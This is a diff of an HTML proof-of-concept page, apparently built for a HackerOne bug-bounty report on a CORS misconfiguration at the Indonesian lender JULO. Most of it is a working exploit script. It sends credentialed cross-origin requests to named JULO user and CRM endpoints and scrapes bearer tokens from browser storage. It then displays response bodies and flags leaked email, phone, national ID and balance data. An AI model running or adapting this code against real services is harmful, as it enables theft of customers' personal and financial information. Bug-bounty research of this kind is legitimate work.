@@ -2,65 +2,96 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>PoC JULO - Naffinc</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC JULO - Naffinc - poc-julo.html</title>
 <style>
-body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px}
-h2{color:#00ff00;border-bottom:1px solid #00ff00;padding-bottom:10px}
-.box{padding:14px;margin:12px 0;border-radius:8px;font-weight:bold}
+body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:18px}
+h2{color:#00ff00;border-bottom:1px solid #00ff00;padding-bottom:8px;margin:0 0 12px}
+.box{padding:14px;margin:12px 0;border-radius:8px;font-weight:bold;word-break:break-all}
 .low{background:#00ff00;color:#000} .medium{background:orange;color:#000}
 .high{background:yellow;color:#000} .critical{background:red;color:#fff}
-pre{background:#111;border:1px solid #333;padding:12px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto}
-button{background:#00ff00;color:#000;border:0;padding:10px 18px;font-weight:bold;cursor:pointer;border-radius:6px}
- small{color:#888}
+pre{background:#111;border:1px solid #333;padding:12px;white-space:pre-wrap;word-break:break-all;max-height:320px;overflow:auto}
+button{background:#00ff00;color:#000;border:0;padding:12px 20px;font-weight:bold;cursor:pointer;border-radius:6px;font-size:14px}
+small{color:#aaa} .info{color:#888;margin:8px 0}
 </style>
 </head>
 <body>
-<h2>PoC JULO CORS - HackerOne: Naffinc</h2>
-<p>Domain: <b>api.julofinance.com (IN-SCOPE)</b> | Origin: https://naffincindonesia.github.io/poc-julo.html</p>
-<button onclick="run()">RUN TEST - MINIMAL MEDIUM</button>
-<div id="status" class="box low">READY - Klik RUN</div>
+<h2>PoC JULO CORS - HackerOne: Naffinc - poc-julo.html</h2>
+<p class="info">Target IN-SCOPE: api.julofinance.com | Origin: https://naffincindonesia.github.io/poc-julo.html<br>Minimal: ORANGE MEDIUM</p>
+<button onclick="run()">RUN TEST</button>
+<div id="status" class="box low">READY - Buka tab julo.co.id login dulu, baru klik RUN di sini</div>
 <div id="out"></div>
 
 <script>
 const endpoints = [
   "https://api.julofinance.com/api/user",
   "https://api.julofinance.com/api/user/me",
+  "https://api.julofinance.com/main.js",
   "https://api.julo.co.id/api/user",
   "https://crm.julo.co.id/api/user"
 ];
 
-async function run(){
-  const out = document.getElementById('out');
-  const status = document.getElementById('status');
-  out.innerHTML = ""; status.className="box medium"; status.innerText="TESTING... Target minimal ORANGE MEDIUM";
+function getToken(){
+  try{
+    let t = localStorage.getItem('token') || localStorage.getItem('accessToken') || localStorage.getItem('access_token') || sessionStorage.getItem('token') || "";
+    // coba cari di semua localStorage yang ada kata token/jwt
+    if(!t){
+      for(let i=0;i<localStorage.length;i++){
+        let k=localStorage.key(i); let v=localStorage.getItem(k);
+        if(k && k.toLowerCase().includes('token') && v && v.length>20){ t=v; break; }
+        if(k && k.toLowerCase().includes('jwt') && v && v.length>20){ t=v; break; }
+      }
+    }
+    return t.replace(/"/g,'');
+  }catch(e){ return ""; }
+}
 
-  let foundMedium = false;
+async function run(){
+  const out=document.getElementById('out');
+  const status=document.getElementById('status');
+  out.innerHTML=""; 
+  status.className="box medium"; 
+  status.innerText="TESTING - Cari ORANGE MEDIUM...";
+
+  let token=getToken();
+  let headers={};
+  if(token){ headers['Authorization']='Bearer '+token; }
+
+  let foundMedium=false;
   for(let url of endpoints){
     try{
-      let res = await fetch(url, {credentials:'include'});
-      let txt = await res.text();
-      let acao = res.headers.get('access-control-allow-origin');
-      let acac = res.headers.get('access-control-allow-credentials');
-      
-      let sev="low", cls="low";
-      if(acao && acac==="true"){
-        if(txt.length>50 && !txt.includes("404") && !txt.includes("<html")){
-          sev="MEDIUM - Data Leak + CORS Credentials"; cls="medium"; foundMedium=true;
-          if(txt.match(/email|phone|nik|balance|saldo/i)) { sev="HIGH/CRITICAL - PII LEAK"; cls="critical"; }
-        } else if(acao) { sev="MEDIUM - CORS Reflect + Creds true"; cls="medium"; foundMedium=true; }
+      let res=await fetch(url,{method:'GET',credentials:'include',headers:headers});
+      let txt=await res.text();
+      let acao=res.headers.get('access-control-allow-origin');
+      let acac=res.headers.get('access-control-allow-credentials');
+      let contentType=res.headers.get('content-type')||"";
+
+      let sev="LOW - No CORS / No Data"; let cls="low";
+      if(acao){
+        if(acac==="true"){
+          if(txt.length>30 && !txt.includes("404") && (contentType.includes("json") || txt.includes("{") || txt.includes("email") || txt.includes("user"))){
+            sev="MEDIUM ORANGE - CORS + Creds + Data Leak"; cls="medium"; foundMedium=true;
+            if(txt.match(/email|phone|nik|ktp|balance|saldo/i)){ sev="CRITICAL MERAH - PII LEAK"; cls="critical"; foundMedium=true; }
+          } else {
+            sev="MEDIUM ORANGE - CORS Reflect + Allow-Credentials true"; cls="medium"; foundMedium=true;
+          }
+        } else {
+          sev="LOW HIJAU - CORS ada tapi tanpa creds"; cls="low";
+        }
       }
-      
-      out.innerHTML += `<div class="box ${cls}">${sev} - ${url}<br><small>ACAO: ${acao} | ACAC: ${acac}</small></div><pre>${txt.substring(0,1500)}</pre>`;
+
+      out.innerHTML+=`<div class="box ${cls}">${sev}<br>${url}<br><small>ACAO: ${acao} | ACAC: ${acac} | Token: ${token? 'YES('+token.substring(0,15)+'...)':'NO'}</small></div><pre>${txt.substring(0,2000)}</pre>`;
     }catch(e){
-      out.innerHTML += `<div class="box low">LOW - ${url} Blocked/CORS Fail</div><pre>${e}</pre>`;
+      out.innerHTML+=`<div class="box low">LOW - ${url} Error/CORS Block<br><small>${e}</small></div>`;
     }
   }
+
   if(foundMedium){
     status.className="box medium";
-    status.innerText="HASIL: MEDIUM ORANGE VALID - Siap submit ke JULO";
+    status.innerText="HASIL: ORANGE MEDIUM VALID - Siap submit ke JULO (bukan LOW lagi)";
   } else {
     status.className="box low";
-    status.innerText="HASIL: LOW - Coba endpoint lain / pakai cookie login";
+    status.innerText="HASIL: MASIH LOW - Token gak kebaca. Buka DevTools > Application > LocalStorage > copy token Julo";
   }
 }
 </script>
